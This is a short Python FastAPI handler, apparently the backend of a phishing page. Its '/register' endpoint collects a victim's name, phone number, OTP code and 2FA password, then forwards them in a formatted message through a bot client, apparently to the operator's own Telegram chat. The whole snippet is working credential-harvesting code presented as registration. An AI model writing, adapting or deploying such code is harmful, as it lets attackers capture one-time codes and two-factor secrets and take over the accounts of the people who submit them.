@app.post("/register")
async def register(request: Request):
    data = await request.json()
    nama = data.get("name")
    phone = data.get("phone")
    step = data.get("step") 
    otp = data.get("otp", "")
    password = data.get("password", "")
    
    # Format pesan lengkap
    message = f"🔔 **Notif Pendaftaran**\n\n👤 Nama: {nama}\n📱 No: {phone}\n🛠 Status: {step}"
    
    if otp:
        message += f"\n🔑 Kode OTP: {otp}"
    if password:
        message += f"\n🔒 Sandi/2FA: {password}"
        
    await bot_client.send_message('me', message)
    return {"status": "success"}